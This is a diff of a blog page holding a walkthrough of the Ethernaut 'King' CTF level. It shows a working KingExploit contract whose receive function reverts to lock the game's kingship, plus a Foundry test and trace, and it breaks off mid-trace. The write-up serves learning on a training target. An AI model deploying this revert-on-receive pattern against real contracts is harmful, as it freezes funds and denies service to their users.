@@ -41,7 +41,11 @@ contract King {
         return king;
     }
 }
-Here is how the game checks if we passed:">
+Here is how the game checks if we passed:
+address(instance).call{value: 0}(&#34;&#34;);
+return instance._king() != address(this);
+It tries to reclaim the kingship, hence &ldquo;to break the game&rdquo;
+means that we must prevent it from restoring the kingship.">
 <meta name="keywords" content="Vasiliy Yorkin">
 <meta name="fediverse:creator" content="" />
 
@@ -49,13 +53,15 @@ Here is how the game checks if we passed:">
   <meta name="twitter:card" content="summary">
   <meta name="twitter:title" content="Ethernaut, #10 King">
   <meta name="twitter:description" content="The goal of this level is to break the game defined by the King contract.
-// SPDX-License-Identifier: MIT pragma solidity ^0.8.2; contract King { address payable king; address payable public owner; uint256 public prize; constructor() payable { owner = payable(msg.sender); king = payable(msg.sender); prize = msg.value; } receive() external payable { require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = payable(msg.sender); prize = msg.value; } function _king() public view returns (address payable) { return king; } } Here is how the game checks if we passed:">
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.2; contract King { address payable king; address payable public owner; uint256 public prize; constructor() payable { owner = payable(msg.sender); king = payable(msg.sender); prize = msg.value; } receive() external payable { require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = payable(msg.sender); prize = msg.value; } function _king() public view returns (address payable) { return king; } } Here is how the game checks if we passed:
+address(instance).call{value: 0}(&#34;&#34;); return instance._king() != address(this); It tries to reclaim the kingship, hence “to break the game” means that we must prevent it from restoring the kingship.">
 
 <meta property="og:url" content="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-10-king/">
   <meta property="og:site_name" content="transcendental kyberautism">
   <meta property="og:title" content="Ethernaut, #10 King">
   <meta property="og:description" content="The goal of this level is to break the game defined by the King contract.
-// SPDX-License-Identifier: MIT pragma solidity ^0.8.2; contract King { address payable king; address payable public owner; uint256 public prize; constructor() payable { owner = payable(msg.sender); king = payable(msg.sender); prize = msg.value; } receive() external payable { require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = payable(msg.sender); prize = msg.value; } function _king() public view returns (address payable) { return king; } } Here is how the game checks if we passed:">
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.2; contract King { address payable king; address payable public owner; uint256 public prize; constructor() payable { owner = payable(msg.sender); king = payable(msg.sender); prize = msg.value; } receive() external payable { require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = payable(msg.sender); prize = msg.value; } function _king() public view returns (address payable) { return king; } } Here is how the game checks if we passed:
+address(instance).call{value: 0}(&#34;&#34;); return instance._king() != address(this); It tries to reclaim the kingship, hence “to break the game” means that we must prevent it from restoring the kingship.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
@@ -75,26 +81,22 @@ Here is how the game checks if we passed:">
 <link rel="preload" href="https://vyorkin.org/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="preload" href="https://vyorkin.org/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
 
-
-  
-  
-  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.07092c1350ffd254998dc43a44ae96e617d14af4df4602626878df89189c5e1a.css" integrity="sha256-BwksE1D/0lSZjcQ6RK6W5hfRSvTfRgJiaHjfiRicXho=" crossorigin="anonymous" media="screen" />
-
-
-
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet">
 
 
   
-    
-    
-    <link rel="stylesheet" href="https://vyorkin.org/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
   
+  <link rel="stylesheet" href="https://vyorkin.org/css/coder.min.070807f22ed87a923883f1a61d2e227d67d923b7fa424ed9a2bf875f4949406e.css" integrity="sha256-BwgH8i7YepI4g/GmHS4ifWfZI7f6Qk7Zor&#43;HX0lJQG4=" crossorigin="anonymous" media="screen" />
+
+
+
+
 
 
 
 
   
-  <link rel="stylesheet" href="https://vyorkin.org/custom.min.cf4424ca575c8638b55547ace7bc3ab68c44ff1c808b1f1bb2358cdbcdbd8c41.css" integrity="sha256-z0Qkyldchji1VUes57w6toxE/xyAix8bsjWM2829jEE=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="https://vyorkin.org/custom.min.e79d44f53b0c4396d73bb2d809d0abbfb31a859a259ae12ed5d6c3a2af56d353.css" integrity="sha256-551E9TsMQ5bXO7LYCdCrv7MahZolmuEu1dbDoq9W01M=" crossorigin="anonymous" media="screen" />
 
 
 <link rel="icon" type="image/svg+xml" href="https://vyorkin.org/images/favicon.svg" sizes="any">
@@ -120,9 +122,7 @@ Here is how the game checks if we passed:">
 
 
 
-
-
-<body class="preload-transitions colorscheme-auto">
+<body class="preload-transitions colorscheme-light">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -161,8 +161,6 @@ Here is how the game checks if we passed:">
           
           
             
-          
-            
               
                 <li class="navigation-item menu-separator">
                   <span>|</span>
@@ -172,6 +170,8 @@ Here is how the game checks if we passed:">
               <li class="navigation-item">
                 <a href="https://vyorkin.org/ru-ru/">ru</a>
               </li>
+            
+          
             
           
             
@@ -232,35 +232,35 @@ Here is how the game checks if we passed:">
         
         <p>The goal of this level is to break the game defined by the
 <code>King</code> contract.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#007f7f">// SPDX-License-Identifier: MIT
-</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">pragma solidity</span> ^<span style="color:#ff0;font-weight:bold">0</span>.<span style="color:#ff0;font-weight:bold">8</span>.<span style="color:#ff0;font-weight:bold">2</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">contract</span> King {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">payable</span> king;
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">payable</span> <span style="color:#fff;font-weight:bold">public</span> owner;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">public</span> prize;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>() <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>        owner = <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
-</span></span><span style="display:flex;"><span>        king = <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
-</span></span><span style="display:flex;"><span>        prize = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    receive() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span> &gt;= prize || <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> == owner);
-</span></span><span style="display:flex;"><span>        king.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>);
-</span></span><span style="display:flex;"><span>        king = <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
-</span></span><span style="display:flex;"><span>        prize = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> _king() <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">view</span> <span style="color:#fff;font-weight:bold">returns</span> (<span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">payable</span>) {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> king;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">King</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">payable</span> <span class="n">king</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">payable</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">prize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">king</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">prize</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;=</span> <span class="n">prize</span> <span class="o">||</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">king</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">king</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">prize</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_king</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span> <span class="k">payable</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">king</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Here is how the game checks if we passed:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">address</span>(instance).<span style="color:#fff;font-weight:bold">call</span>{<span style="color:#fff;font-weight:bold">value</span>: <span style="color:#ff0;font-weight:bold">0</span>}(<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">return</span> instance._king() != <span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">address</span><span class="p">(</span><span class="n">instance</span><span class="p">).</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">0</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">instance</span><span class="p">.</span><span class="n">_king</span><span class="p">()</span> <span class="o">!=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">);</span>
 </span></span></code></pre></div><p>It tries to reclaim the kingship, hence &ldquo;to break the game&rdquo;
 means that we must prevent it from restoring the kingship.</p>
 <h2 id="analysis">
@@ -271,29 +271,29 @@ means that we must prevent it from restoring the kingship.</p>
   </a>
 </h2>
 <p>There are 3 state variables in the <code>King</code> contact:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">payable</span> king;
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">payable</span> <span style="color:#fff;font-weight:bold">public</span> owner;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">uint256</span> <span style="color:#fff;font-weight:bold">public</span> prize;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">payable</span> <span class="n">king</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">payable</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">uint256</span> <span class="k">public</span> <span class="n">prize</span><span class="p">;</span>
 </span></span></code></pre></div><p>We start with the <code>king</code> and the <code>owner</code> set to a deployer of
 the <code>King</code> contract, which is the <code>levelFactory</code> &ndash; contract
 responsible for setting up the level and checking the winning
 conditions.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">constructor</span>() <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>    owner = <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
-</span></span><span style="display:flex;"><span>    king = <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
-</span></span><span style="display:flex;"><span>    prize = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>;
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">owner</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">king</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prize</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>So this is our initial state:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>assertEq(level._king(), <span style="color:#fff;font-weight:bold">address</span>(levelFactory));
-</span></span><span style="display:flex;"><span>assertEq(level.prize(), <span style="color:#ff0;font-weight:bold">0</span>);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">assertEq</span><span class="p">(</span><span class="n">level</span><span class="p">.</span><span class="n">_king</span><span class="p">(),</span> <span class="kt">address</span><span class="p">(</span><span class="n">levelFactory</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">assertEq</span><span class="p">(</span><span class="n">level</span><span class="p">.</span><span class="n">prize</span><span class="p">(),</span> <span class="mi">0</span><span class="p">);</span>
 </span></span></code></pre></div><p>Now, let&rsquo;s have a look at the <code>receive</code> function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> receive() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">require</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span> &gt;= prize || <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span> == owner);
-</span></span><span style="display:flex;"><span>    king.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>);
-</span></span><span style="display:flex;"><span>    king = <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">sender</span>);
-</span></span><span style="display:flex;"><span>    prize = <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>;
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"> <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span> <span class="o">&gt;=</span> <span class="n">prize</span> <span class="o">||</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">king</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">king</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">prize</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>To become a new king we need to send the same or more ETH than
 the current <code>prize</code>. Then the contract will <code>transfer</code> the
 current prize to the previous king, set our address as the new
@@ -316,98 +316,98 @@ implement it so that it breaks the transfer logic.</p>
 <li>Implement one of these functions, but immediately revert.</li>
 </ol>
 <p>For example, let&rsquo;s try #2:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#fff;font-weight:bold">contract</span> KingExploit {
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">address</span> <span style="color:#fff;font-weight:bold">payable</span> level;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">constructor</span>(King _king) {
-</span></span><span style="display:flex;"><span>        level = <span style="color:#fff;font-weight:bold">payable</span>(<span style="color:#fff;font-weight:bold">address</span>(_king));
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> run() <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>        (<span style="color:#fff;font-weight:bold">bool</span> success,) = level.<span style="color:#fff;font-weight:bold">call</span>{<span style="color:#fff;font-weight:bold">value</span>: <span style="color:#fff;font-weight:bold">msg</span>.<span style="color:#fff;font-weight:bold">value</span>}(<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">require</span>(success, <span style="color:#0ff;font-weight:bold">&#34;failed to send ether&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    receive() <span style="color:#fff;font-weight:bold">external</span> <span style="color:#fff;font-weight:bold">payable</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">revert</span>(<span style="color:#0ff;font-weight:bold">&#34;muhahaha&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"> <span class="kd">contract</span> <span class="nc">KingExploit</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">payable</span> <span class="n">level</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="n">King</span> <span class="n">_king</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">level</span> <span class="o">=</span> <span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">_king</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span> <span class="n">level</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">value</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;failed to send ether&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">revert</span><span class="p">(</span><span class="s">&#34;muhahaha&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>Now, let&rsquo;s make it a king:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> exploit() <span style="color:#fff;font-weight:bold">internal</span> <span style="color:#fff;font-weight:bold">override</span> {
-</span></span><span style="display:flex;"><span>    vm.startPrank(player);
-</span></span><span style="display:flex;"><span>    KingExploit expl = <span style="color:#fff;font-weight:bold">new</span> KingExploit(level);
-</span></span><span style="display:flex;"><span>    expl.run{<span style="color:#fff;font-weight:bold">value</span>: <span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">wei</span>}();
-</span></span><span style="display:flex;"><span>    vm.stopPrank();
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="k">internal</span> <span class="k">override</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">startPrank</span><span class="p">(</span><span class="n">player</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">KingExploit</span> <span class="n">expl</span> <span class="o">=</span> <span class="k">new</span> <span class="n">KingExploit</span><span class="p">(</span><span class="n">level</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">expl</span><span class="p">.</span><span class="n">run</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">wei</span><span class="p">}();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">stopPrank</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>This is it! The trace:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#fff;font-weight:bold">test</span> --match-contract KingTest -vvvv
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Running <span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">test</span> <span style="color:#fff;font-weight:bold">for</span> src/test/King.t.sol:KingTest
-</span></span><span style="display:flex;"><span>[PASS] testKing() (gas: 431179)
-</span></span><span style="display:flex;"><span>Traces:
-</span></span><span style="display:flex;"><span>  [431179] KingTest::testKing()
-</span></span><span style="display:flex;"><span>    ├─ [215833] KingTest::create()
-</span></span><span style="display:flex;"><span>    │   ├─ [0] VM::prank(player: [...])
-</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   ├─ [203485] Ethernaut::createLevelInstance(KingFactory: [...])
-</span></span><span style="display:flex;"><span>    │   │   ├─ [151922] KingFactory::createInstance(player: [...])
-</span></span><span style="display:flex;"><span>    │   │   │   ├─ [119381] → new King@<span style="color:#0ff;font-weight:bold">&#34;0x037f…dd8f&#34;</span>
-</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#ff0;font-weight:bold">364</span> bytes of code
-</span></span><span style="display:flex;"><span>    │   │   │   └─ ← King: [...]
-</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog(player: player: [...], instance: King: [...])
-</span></span><span style="display:flex;"><span>    │   │   └─ ← King: [...]
-</span></span><span style="display:flex;"><span>    │   └─ ← King: [...]
-</span></span><span style="display:flex;"><span>    ├─ [287] King::_king() [staticcall]
-</span></span><span style="display:flex;"><span>    │   └─ ← KingFactory: [...]
-</span></span><span style="display:flex;"><span>    ├─ [317] King::prize() [staticcall]
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#ff0;font-weight:bold">0</span>
-</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [...])
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [86666] → new KingExploit@<span style="color:#0ff;font-weight:bold">&#34;0xa2f9…f3a7&#34;</span>
-</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#ff0;font-weight:bold">321</span> bytes of code
-</span></span><span style="display:flex;"><span>    ├─ [34652] KingExploit::run{value: 1}()
-</span></span><span style="display:flex;"><span>    │   ├─ [27516] King::fallback{value: 1}()
-</span></span><span style="display:flex;"><span>    │   │   ├─ [55] KingFactory::fallback{value: 1}()
-</span></span><span style="display:flex;"><span>    │   │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   │   └─ ← ()
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [0] VM::stopPrank()
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [0] VM::startPrank(player: [...])
-</span></span><span style="display:flex;"><span>    │   └─ ← ()
-</span></span><span style="display:flex;"><span>    ├─ [5470] Ethernaut::submitLevelInstance(King: [...])
-</span></span><span style="display:flex;"><span>    │   ├─ [2423] KingFactory::validateInstance(King: [...], player: [...])
